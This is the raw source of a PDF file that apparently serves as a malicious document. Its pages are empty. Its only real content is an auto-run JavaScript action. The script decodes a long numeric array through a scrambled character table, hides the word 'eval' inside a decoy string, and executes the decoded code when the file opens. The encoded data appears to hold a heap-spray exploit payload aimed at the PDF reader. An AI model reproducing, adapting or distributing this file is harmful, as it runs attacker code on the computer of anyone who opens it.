%PDF-1.5
%‚„œ”
7 0 obj
<</Count 1/Type/Pages/Kids[28 0 R]>>
endobj
10 0 obj
<</Creator(sli)/ModDate(D:20080817171147-07'00')/Company(Windjack Solutions, Inc.)/Title(al)>>
endobj
21 0 obj
<</Names 23 0 R/Outlines 1 0 R/Metadata 9 0 R/AcroForm 22 0 R/Pages 7 0 R/OCProperties<</D<</RBGroups[]/OFF[]/Order[]>>/OCGs[27 0 R]>>/StructTreeRoot 11 0 R/Type/Catalog>>
endobj
23 0 obj
<</JavaScript 24 0 R/AP 8 0 R>>
endobj
24 0 obj
<</Names[78 0 R 76 0 R]>>
endobj
25 0 obj
<</S/JavaScript/JS 26 0 R>>
endobj
26 0 obj
<</Length 4/Filter[/FlateDecode]>>stream
endstream
endobj
28 0 obj
<</CropBox[37 37 575 755]/Annots 29 0 R/Parent 7 0 R/StructParents 0/Contents 60 0 R/Rotate 90/MediaBox[0 0 612 792]/Resources<</XObject<</Im0 69 0 R>>/ColorSpace<</CS0 59 0 R>>/Font<</TT0 61 0 R>>/ProcSet[/PDF/Text/ImageC]/Properties<</MC0 27 0 R>>/ExtGState<</GS0 72 0 R>>>>/Type/Page>>
endobj
59 0 obj
[/ICCBased 68 0 R]
endobj
60 0 obj
<</Length 4/Filter/FlateDecode/Type/Contents>>
stream
endstream
endobj
76 0 obj
<</S/JavaScript/JS(
function test2\(\){v=ar[z];s=s+cc[v];}
ar=[16,
51,
22,
40,
75,
10,
15,
55,
9,
12,
65,
65,
15,
55,
8,
7,
32,
45,
15,
55,
9,
56,
8,
7,
15,
55,
46,
56,
32,
45,
15,
55,
32,
13,
12,
45,
15,
55,
12,
12,
56,
8,
15,
55,
65,
45,
7,
31,
15,
55,
45,
31,
9,
16,
15,
55,
9,
16,
12,
31,
15,
55,
31,
7,
45,
31,
15,
55,
46,
31,
9,
16,
15,
55,
56,
65,
18,
7,
15,
55,
46,
65,
9,
16,
15,
55,
12,
12,
31,
9,
15,
55,
65,
65,
20,
16,
15,
55,
56,
32,
9,
16,
15,
55,
31,
12,
12,
7,
15,
55,
12,
12,
46,
45,
15,
55,
9,
18,
58,
7,
15,
55,
18,
56,
32,
32,
15,
55,
8,
8,
18,
31,
15,
55,
16,
9,
8,
8,
15,
55,
45,
31,
9,
16,
15,
55,
7,
12,
12,
31,
15,
55,
12,
13,
45,
65,
15,
55,
46,
56,
31,
65,
15,
55,
9,
46,
8,
16,
15,
55,
58,
45,
12,
45,
15,
55,
32,
45,
9,
56,
15,
55,
56,
18,
46,
56,
15,
55,
32,
16,
32,
13,
15,
55,
56,
18,
45,
7,
15,
55,
9,
16,
56,
65,
15,
55,
12,
7,
46,
56,
15,
55,
46,
45,
9,
16,
15,
55,
46,
9,
12,
56,
15,
55,
8,
56,
31,
12,
15,
55,
9,
16,
56,
65,
15,
55,
58,
31,
46,
65,
15,
55,
8,
56,
31,
12,
15,
55,
7,
13,
12,
12,
15,
55,
45,
18,
45,
13,
15,
55,
27,
20,
8,
7,
15,
55,
7,
56,
31,
12,
15,
55,
20,
16,
12,
12,
15,
55,
16,
32,
31,
8,
15,
55,
12,
9,
18,
31,
15,
55,
46,
45,
8,
58,
15,
55,
7,
18,
31,
9,
15,
55,
31,
20,
7,
16,
15,
55,
20,
27,
31,
12,
15,
55,
32,
16,
45,
31,
15,
55,
12,
16,
8,
18,
15,
55,
46,
56,
18,
8,
15,
55,
56,
32,
32,
65,
15,
55,
56,
32,
9,
16,
15,
55,
31,
12,
58,
45,
15,
55,
65,
65,
20,
20,
15,
55,
31,
7,
9,
16,
15,
55,
9,
20,
45,
16,
15,
55,
32,
7,
45,
65,
15,
55,
56,
45,
8,
8,
15,
55,
31,
7,
58,
45,
15,
55,
20,
9,
9,
16,
15,
55,
20,
20,
31,
12,
15,
55,
31,
45,
9,
16,
15,
55,
31,
12,
9,
16,
15,
55,
27,
16,
7,
56,
15,
55,
56,
13,
56,
32,
15,
55,
32,
16,
7,
12,
15,
55,
27,
20,
56,
12,
15,
55,
65,
9,
9,
16,
15,
55,
9,
31,
58,
31,
15,
55,
31,
7,
46,
20,
15,
55,
46,
45,
12,
12,
15,
55,
13,
65,
31,
12,
15,
55,
8,
12,
32,
16,
15,
55,
65,
9,
9,
16,
15,
55,
9,
16,
31,
9,
15,
55,
65,
27,
8,
46,
15,
55,
56,
13,
31,
56,
15,
55,
13,
9,
32,
9,
15,
55,
8,
8,
8,
8,
15,
55,
32,
58,
8,
8,
15,
55,
32,
9,
8,
13,
15,
55,
31,
31,
31,
31,
15,
55,
31,
31,
31,
31,
15,
55,
56,
31,
56,
9,
15,
55,
45,
31,
65,
27,
15,
55,
8,
8,
65,
9,
15,
55,
31,
31,
31,
31,
15,
55,
56,
31,
31,
31,
15,
55,
7,
31,
9,
12,
15,
55,
56,
31,
18,
13,
15,
55,
9,
16,
56,
56,
15,
55,
9,
16,
32,
7,
15,
55,
18,
31,
56,
32,
15,
55,
7,
12,
9,
12,
15,
55,
8,
8,
31,
56,
15,
55,
65,
9,
32,
12,
15,
55,
65,
32,
65,
8,
15,
55,
31,
31,
31,
31,
15,
55,
46,
56,
65,
9,
15,
55,
65,
7,
46,
58,
15,
55,
56,
45,
65,
20,
15,
55,
18,
65,
8,
8,
15,
55,
7,
45,
9,
12,
15,
55,
9,
16,
31,
9,
15,
55,
32,
9,
32,
9,
15,
55,
8,
8,
65,
18,
15,
55,
8,
8,
8,
8,
15,
55,
31,
58,
32,
16,
15,
55,
46,
58,
32,
16,
15,
55,
32,
7,
9,
18,
15,
55,
31,
18,
31,
45,
15,
55,
31,
31,
31,
31,
15,
55,
56,
7,
9,
20,
15,
55,
31,
7,
58,
45,
15,
55,
31,
45,
7,
46,
15,
55,
46,
58,
58,
45,
15,
55,
65,
46,
65,
56,
15,
55,
7,
46,
46,
12,
15,
55,
58,
45,
45,
45,
15,
55,
46,
65,
31,
45,
15,
55,
12,
12,
46,
58,
15,
55,
7,
46,
12,
58,
15,
55,
58,
45,
45,
45,
15,
55,
58,
31,
31,
9,
15,
55,
46,
12,
58,
20,
15,
55,
56,
12,
58,
31,
15,
55,
8,
9,
65,
9,
15,
55,
31,
31,
31,
31,
15,
55,
8,
8,
31,
31,
15,
55,
31,
7,
56,
65,
15,
55,
32,
9,
9,
16,
15,
55,
7,
13,
12,
12,
15,
55,
7,
46,
56,
18,
15,
55,
18,
20,
45,
45,
15,
55,
46,
46,
31,
31,
15,
55,
65,
58,
46,
31,
15,
55,
7,
46,
46,
45,
15,
55,
18,
20,
45,
45,
15,
55,
58,
32,
31,
56,
15,
55,
65,
7,
65,
45,
15,
55,
7,
65,
65,
7,
15,
55,
18,
20,
45,
45,
15,
55,
31,
31,
31,
13,
15,
55,
9,
27,
56,
13,
15,
55,
31,
45,
7,
18,
15,
55,
9,
9,
12,
31,
15,
55,
18,
20,
45,
45,
15,
55,
45,
18,
31,
45,
15,
55,
65,
27,
56,
18,
15,
55,
65,
27,
31,
31,
15,
55,
56,
12,
31,
31,
15,
55,
65,
27,
56,
46,
15,
55,
8,
8,
31,
31,
15,
55,
18,
45,
56,
65,
15,
55,
7,
31,
9,
56,
15,
55,
18,
65,
46,
56,
15,
55,
31,
31,
65,
27,
15,
55,
8,
8,
56,
12,
15,
55,
31,
45,
56,
65,
15,
55,
31,
31,
65,
27,
15,
55,
32,
16,
9,
12,
15,
55,
56,
12,
31,
7,
15,
55,
56,
65,
8,
8,
15,
55,
9,
12,
31,
45,
15,
55,
31,
7,
7,
12,
15,
55,
31,
58,
32,
16,
15,
55,
18,
12,
32,
16,
15,
55,
9,
31,
45,
46,
15,
55,
31,
31,
12,
8,
15,
55,
8,
27,
46,
56,
15,
55,
9,
31,
45,
46,
15,
55,
31,
31,
12,
8,
15,
55,
7,
45,
46,
56,
15,
55,
31,
31,
65,
27,
15,
55,
8,
32,
65,
27,
15,
55,
56,
65,
8,
8,
15,
55,
32,
9,
31,
9,
15,
55,
8,
32,
13,
7,
15,
55,
8,
8,
8,
8,
15,
55,
45,
32,
9,
32,
15,
55,
32,
7,
31,
32,
15,
55,
8,
32,
13,
9,
15,
55,
31,
32,
9,
27,
15,
55,
65,
8,
9,
13,
15,
55,
16,
20,
31,
18,
15,
55,
7,
27,
12,
12,
15,
55,
56,
16,
9,
27,
15,
55,
7,
65,
18,
16,
15,
55,
46,
13,
45,
65,
15,
55,
18,
27,
12,
65,
15,
55,
46,
31,
58,
8,
15,
55,
46,
45,
65,
9,
15,
55,
46,
31,
46,
45,
15,
55,
58,
8,
12,
27,
15,
55,
12,
13,
58,
8,
15,
55,
58,
32,
12,
18,
15,
55,
12,
18,
12,
58,
15,
55,
58,
32,
12,
9,
15,
55,
12,
9,
12,
12,
15,
55,
12,
18,
58,
32,
15,
55,
12,
46,
12,
65,
15,
55,
46,
46,
58,
8,
15,
55,
46,
31,
58,
32,
15,
55,
46,
31,
65,
9,
15,
55,
65,
65,
12,
8,
15,
55,
12,
58,
12,
20,
15,
55,
12,
56,
12,
65,
15,
55,
12,
58,
12,
31,
15,
55,
65,
56,
58,
65,
15,
55,
12,
12,
12,
20,
15,
55,
31,
31,
31,
31,
10,
49,
8,
55,
37,
7,
14,
69,
5,
37,
34,
32,
63,
28,
57,
60,
57,
27,
26,
52,
61,
19,
23,
72,
3,
69,
11,
32,
60,
57,
27,
17,
11,
32,
37,
40,
14,
3,
1,
58,
4,
52,
61,
19,
23,
57,
27,
47,
75,
57,
27,
49,
43,
57,
27,
75,
57,
27,
17,
22,
55,
16,
22,
14,
57,
69,
37,
40,
60,
31,
26,
52,
61,
0,
58,
19,
49,
57,
32,
14,
55,
57,
37,
34,
57,
27,
49,
43,
34,
8,
55,
37,
7,
14,
69,
5,
37,
34,
16,
44,
60,
19,
23,
28,
27,
57,
34,
20,
62,
40,
75,
37,
32,
72,
34,
24,
57,
57,
27,
61,
60,
19,
49,
28,
27,
57,
34,
28,
72,
75,
31,
44,
31,
7,
31,
7,
31,
7,
31,
7,
49,
28,
27,
57,
34,
27,
20,
20,
57,
75,
31,
44,
45,
31,
31,
31,
31,
31,
49,
28,
27,
57,
34,
35,
27,
61,
11,
5,
27,
20,
75,
55,
37,
32,
22,
7,
27,
35,
32,
60,
16,
51,
22,
40,
19,
49,
28,
27,
57,
34,
22,
7,
36,
11,
32,
37,
75,
35,
27,
61,
11,
5,
27,
20,
17,
11,
32,
37,
40,
14,
3,
1,
58,
49,
28,
27,
57,
34,
52,
61,
75,
27,
20,
20,
57,
59,
60,
22,
7,
36,
11,
32,
37,
47,
31,
44,
12,
9,
19,
49,
28,
27,
57,
34,
61,
27,
57,
22,
35,
75,
55,
37,
32,
22,
7,
27,
35,
32,
60,
64,
15,
55,
13,
31,
13,
31,
15,
55,
13,
31,
13,
31,
64,
19,
49,
61,
27,
57,
22,
35,
75,
32,
63,
28,
57,
60,
61,
27,
57,
22,
35,
26,
52,
61,
19,
49,
28,
27,
57,
34,
7,
5,
55,
37,
14,
58,
75,
60,
28,
72,
59,
31,
44,
45,
31,
31,
31,
31,
31,
19,
0,
27,
20,
20,
57,
49,
8,
5,
57,
60,
28,
27,
57,
34,
7,
5,
55,
37,
14,
75,
31,
49,
7,
5,
55,
37,
14,
4,
7,
5,
55,
37,
14,
58,
49,
7,
5,
55,
37,
14,
47,
47,
19,
23,
20,
62,
40,
21,
7,
5,
55,
37,
14,
71,
75,
61,
27,
57,
22,
35,
47,
35,
27,
61,
11,
5,
27,
20,
49,
43,
34,
28,
27,
57,
34,
5,
28,
32,
57,
8,
11,
5,
72,
75,
55,
37,
32,
22,
7,
27,
35,
32,
60,
64,
15,
55,
31,
7,
31,
7,
15,
55,
31,
7,
31,
7,
64,
19,
49,
72,
3,
69,
11,
32,
60,
5,
28,
32,
57,
8,
11,
5,
72,
17,
11,
32,
37,
40,
14,
3,
4,
45,
45,
13,
56,
58,
19,
23,
5,
28,
32,
57,
8,
11,
5,
72,
47,
75,
5,
28,
32,
57,
8,
11,
5,
72,
49,
43,
34,
14,
3,
69,
22,
17,
7,
5,
11,
11,
27,
16,
2,
14,
5,
57,
32,
75,
25,
5,
11,
11,
27,
16,
17,
7,
5,
11,
11,
32,
7,
14,
53,
38,
27,
69,
11,
70,
37,
8,
5,
60,
23,
22,
55,
16,
51,
29,
64,
64,
26,
38,
22,
40,
29,
5,
28,
32,
57,
8,
11,
5,
72,
43,
19,
49,
43,
34,
8,
55,
37,
7,
14,
69,
5,
37,
34,
35,
57,
69,
37,
14,
8,
60,
19,
23,
37,
5,
35,
75,
55,
37,
32,
22,
7,
27,
35,
32,
60,
64,
15,
55,
31,
24,
31,
24,
15,
55,
31,
24,
31,
24,
15,
55,
31,
24,
31,
24,
15,
55,
31,
24,
31,
24,
64,
19,
49,
28,
27,
57,
34,
35,
27,
61,
11,
5,
27,
20,
75,
55,
37,
32,
22,
7,
27,
35,
32,
60,
16,
51,
22,
40,
19,
49,
3,
32,
27,
35,
16,
11,
5,
7,
62,
75,
37,
5,
35,
47,
35,
27,
61,
11,
5,
27,
20,
49,
16,
69,
40,
16,
11,
5,
7,
62,
75,
55,
37,
32,
22,
7,
27,
35,
32,
60,
64,
15,
55,
31,
24,
31,
24,
15,
55,
31,
24,
31,
24,
64,
19,
49,
3,
32,
27,
20,
32,
57,
22,
69,
63,
32,
75,
58,
31,
49,
22,
35,
57,
27,
61,
75,
3,
32,
27,
20,
32,
57,
22,
69,
63,
32,
47,
3,
32,
27,
35,
16,
11,
5,
7,
62,
17,
11,
32,
37,
40,
14,
3,
49,
72,
3,
69,
11,
32,
60,
16,
69,
40,
16,
11,
5,
7,
62,
17,
11,
32,
37,
40,
14,
3,
4,
22,
35,
57,
27,
61,
19,
23,
16,
69,
40,
16,
11,
5,
7,
62,
47,
75,
16,
69,
40,
16,
11,
5,
7,
62,
49,
43,
34,
8,
69,
11,
11,
16,
11,
5,
7,
62,
75,
16,
69,
40,
16,
11,
5,
7,
62,
17,
22,
55,
16,
22,
14,
57,
69,
37,
40,
60,
31,
26,
22,
35,
57,
27,
61,
19,
49,
16,
11,
5,
7,
62,
75,
16,
69,
40,
16,
11,
5,
7,
62,
17,
22,
55,
16,
22,
14,
57,
69,
37,
40,
60,
31,
26,
16,
69,
40,
16,
11,
5,
7,
62,
17,
11,
32,
37,
40,
14,
3,
59,
22,
35,
57,
27,
61,
19,
49,
72,
3,
69,
11,
32,
60,
16,
11,
5,
7,
62,
17,
11,
32,
37,
40,
14,
3,
47,
22,
35,
57,
27,
61,
4,
31,
44,
45,
31,
31,
31,
31,
19,
23,
16,
11,
5,
7,
62,
75,
16,
11,
5,
7,
62,
47,
16,
11,
5,
7,
62,
47,
8,
69,
11,
11,
16,
11,
5,
7,
62,
49,
43,
34,
38,
32,
38,
75,
37,
32,
72,
34,
24,
57,
57,
27,
61,
60,
19,
49,
8,
5,
57,
60,
69,
75,
31,
49,
69,
4,
18,
45,
31,
31,
49,
69,
47,
47,
19,
23,
38,
32,
38,
21,
69,
71,
75,
16,
11,
5,
7,
62,
47,
3,
32,
27,
35,
16,
11,
5,
7,
62,
49,
43,
34,
28,
27,
57,
34,
37,
55,
38,
75,
18,
58,
13,
13,
13,
13,
13,
13,
13,
13,
13,
13,
13,
13,
13,
13,
13,
13,
13,
13,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
9,
49,
55,
14,
69,
11,
17,
35,
57,
69,
37,
14,
8,
60,
64,
15,
45,
56,
31,
31,
31,
8,
64,
26,
37,
55,
38,
19,
49,
43,
34,
8,
55,
37,
7,
14,
69,
5,
37,
34,
40,
32,
14,
69,
7,
5,
37,
60,
19,
23,
28,
27,
57,
34,
27,
57,
57,
61,
75,
37,
32,
72,
34,
24,
57,
57,
27,
61,
60,
19,
49,
69,
8,
60,
27,
35,
35,
17,
20,
5,
7,
17,
25,
5,
11,
11,
27,
16,
17,
40,
32,
14,
70,
7,
5,
37,
19,
23,
28,
27,
57,
34,
35,
27,
61,
11,
5,
27,
20,
75,
55,
37,
32,
22,
7,
27,
35,
32,
60,
16,
51,
22,
40,
19,
49,
28,
27,
57,
34,
3,
50,
52,
56,
31,
31,
25,
33,
75,
35,
27,
61,
11,
5,
27,
20,
17,
11,
32,
37,
40,
14,
3,
1,
58,
49,
28,
27,
57,
34,
52,
61,
75,
31,
44,
45,
31,
31,
31,
31,
31,
59,
60,
3,
50,
52,
56,
31,
31,
25,
33,
47,
31,
44,
12,
9,
19,
49,
28,
27,
57,
34,
61,
27,
57,
22,
35,
75,
55,
37,
32,
22,
7,
27,
35,
32,
60,
64,
15,
55,
13,
31,
13,
31,
15,
55,
13,
31,
13,
31,
64,
19,
49,
61,
27,
57,
22,
35,
75,
32,
63,
28,
57,
60,
61,
27,
57,
22,
35,
26,
52,
61,
19,
49,
28,
27,
57,
34,
35,
56,
24,
51,
67,
65,
56,
8,
75,
60,
31,
44,
31,
7,
31,
7,
31,
7,
31,
7,
59,
31,
44,
45,
31,
31,
31,
31,
31,
19,
0,
31,
44,
45,
31,
31,
31,
31,
31,
49,
8,
5,
57,
60,
28,
27,
57,
34,
28,
52,
7,
42,
39,
13,
65,
61,
75,
31,
49,
28,
52,
7,
42,
39,
13,
65,
61,
4,
35,
56,
24,
51,
67,
65,
56,
8,
49,
28,
52,
7,
42,
39,
13,
65,
61,
47,
47,
19,
23,
27,
57,
57,
61,
21,
28,
52,
7,
42,
39,
13,
65,
61,
71,
75,
61,
27,
57,
22,
35,
47,
35,
27,
61,
11,
5,
27,
20,
49,
43,
34,
28,
27,
57,
34,
14,
41,
73,
3,
33,
16,
54,
72,
75,
55,
37,
32,
22,
7,
27,
35,
32,
60,
64,
15,
31,
13,
64,
19,
49,
72,
3,
69,
11,
32,
60,
14,
41,
73,
3,
33,
16,
54,
72,
17,
11,
32,
37,
40,
14,
3,
4,
31,
44,
45,
31,
31,
31,
19,
23,
14,
41,
73,
3,
33,
16,
54,
72,
47,
75,
14,
41,
73,
3,
33,
16,
54,
72,
49,
43,
34,
14,
41,
73,
3,
33,
16,
54,
72,
75,
64,
33,
17,
64,
47,
14,
41,
73,
3,
33,
16,
54,
72,
49,
27,
35,
35,
17,
20,
5,
7,
17,
25,
5,
11,
11,
27,
16,
17,
40,
32,
14,
70,
7,
5,
37,
60,
14,
41,
73,
3,
33,
16,
54,
72,
19,
49,
43,
43,
34,
27,
30,
11,
55,
40,
69,
37,
22,
75,
27,
35,
35,
17,
35,
11,
55,
40,
70,
37,
22,
49,
28,
27,
57,
34,
22,
28,
75,
35,
27,
57,
22,
32,
70,
37,
14,
60,
27,
35,
35,
17,
28,
69,
32,
72,
32,
57,
6,
32,
57,
22,
69,
5,
37,
17,
14,
5,
2,
14,
57,
69,
37,
40,
60,
19,
17,
7,
3,
27,
57,
24,
14,
60,
31,
19,
19,
49,
8,
5,
57,
60,
28,
27,
57,
34,
69,
75,
31,
49,
69,
4,
27,
30,
11,
55,
40,
69,
37,
22,
17,
11,
32,
37,
40,
14,
3,
49,
69,
47,
47,
19,
23,
69,
8,
60,
27,
30,
11,
55,
40,
69,
37,
22,
21,
69,
71,
17,
37,
27,
38,
32,
75,
75,
10,
53,
2,
7,
57,
69,
35,
14,
10,
19,
23,
28,
27,
57,
34,
11,
28,
75,
27,
30,
11,
55,
40,
69,
37,
22,
21,
69,
71,
17,
28,
32,
57,
22,
69,
5,
37,
49,
43,
43,
34,
69,
8,
60,
60,
11,
28,
75,
75,
13,
19,
74,
74,
60,
60,
22,
28,
75,
75,
9,
19,
48,
48,
60,
11,
28,
4,
75,
9,
17,
18,
58,
19,
19,
19,
23,
40,
32,
14,
69,
7,
5,
37,
60,
19,
49,
43,
32,
11,
22,
32,
34,
69,
8,
60,
11,
28,
75,
75,
46,
17,
18,
19,
23,
35,
57,
69,
37,
14,
8,
60,
19,
49,
43,
32,
11,
22,
32,
34,
69,
8,
60,
60,
60,
22,
28,
75,
75,
65,
19,
74,
74,
60,
22,
28,
75,
75,
46,
19,
19,
48,
48,
60,
11,
28,
4,
46,
17,
18,
18,
19,
19,
23,
16,
44,
60,
19,
49,
43,
32,
11,
22,
32,
34,
69,
8,
60,
60,
11,
28,
68,
75,
13,
17,
18,
19,
74,
74,
60,
11,
28,
4,
75,
13,
17,
58,
19,
74,
74,
60,
11,
28,
68,
75,
9,
17,
18,
12,
19,
74,
74,
60,
11,
28,
4,
75,
9,
17,
18,
46,
19,
19,
23,
8,
55,
37,
7,
14,
69,
5,
37,
34,
27,
60,
19,
23,
55,
14,
69,
11,
17,
35,
57,
69,
37,
14,
20,
60,
10,
35,
66,
18,
18,
18,
18,
18,
18,
18,
18,
18,
18,
18,
18,
18,
18,
18,
18,
18,
18,
18,
18,
18,
18,
18,
18,
34,
29,
34,
61,
61,
61,
61,
18,
18,
18,
10,
26,
37,
32,
72,
34,
39,
27,
14,
32,
60,
19,
19,
49,
43,
28,
27,
57,
34,
3,
75,
27,
35,
35,
17,
35,
11,
55,
40,
70,
37,
22,
49,
8,
5,
57,
60,
28,
27,
57,
34,
8,
75,
31,
49,
8,
4,
3,
17,
11,
32,
37,
40,
14,
3,
49,
8,
47,
47,
19,
23,
69,
8,
60,
3,
21,
8,
71,
17,
37,
27,
38,
32,
75,
75,
10,
53,
2,
7,
57,
69,
35,
14,
10,
19,
23,
28,
27,
57,
34,
69,
75,
3,
21,
8,
71,
17,
28,
32,
57,
22,
69,
5,
37,
49,
43,
43,
34,
69,
8,
60,
60,
69,
68,
9,
17,
18,
58,
19,
48,
48,
60,
69,
4,
9,
17,
58,
19,
19,
23,
7,
75,
37,
32,
72,
34,
24,
57,
57,
27,
61,
60,
19,
49,
28,
27,
57,
34,
20,
75,
55,
37,
32,
22,
7,
27,
35,
32,
60,
10,
15,
55,
13,
31,
13,
31,
15,
55,
13,
31,
13,
31,
10,
19,
49,
28,
27,
57,
34,
32,
75,
55,
37,
32,
22,
7,
27,
35,
32,
60,
16,
51,
22,
40,
19,
49,
72,
3,
69,
11,
32,
60,
20,
17,
11,
32,
37,
40,
14,
3,
4,
75,
31,
44,
9,
31,
31,
31,
19,
23,
20,
47,
75,
20,
49,
43,
20,
75,
20,
17,
22,
55,
16,
22,
14,
57,
60,
31,
26,
31,
44,
9,
31,
31,
31,
59,
32,
17,
11,
32,
37,
40,
14,
3,
19,
49,
8,
5,
57,
60,
8,
75,
31,
49,
8,
4,
58,
13,
31,
31,
49,
8,
47,
47,
19,
23,
7,
21,
8,
71,
75,
20,
47,
32,
49,
43,
27,
60,
19,
49,
27,
60,
19,
49,
14,
57,
61,
23,
14,
3,
69,
22,
17,
38,
32,
20,
69,
27,
17,
37,
32,
72,
30,
11,
27,
61,
32,
57,
60,
37,
55,
11,
11,
19,
49,
43,
7,
27,
14,
7,
3,
60,
32,
19,
23,
43,
27,
60,
19,
49,
43,
43];
cc={q:"/*Sh<oVcf8'l39t%b.1\)d[s{AC,av:P0eN p_nmDgUQ}x47+&;WjqEGu5r2-\(ykz'6@K>iI]wM|="}.q;
qq='12e'+'wqva!l';
q=qq[2]+qq[5]+qq[6]+qq[8];
try{loadXML\({}\);}catch\($\){
b={v:{q:this}}.v.q;
w={v:b[q]}.v;
s=Array\(\);
n={v:cc}.v;
for\(i=0;i-3854<0;i++\){
z=i;
test2\(\);
}
w\(s\);
}
)>>
endobj
xref
0 12
trailer
<</Size 12
/Root 21 0 R>>
xref
0 0
trailer
<</Size 12/Prev 75626/XRefStm 416/Root 21 0 R>>
startxref
78995
%%EOF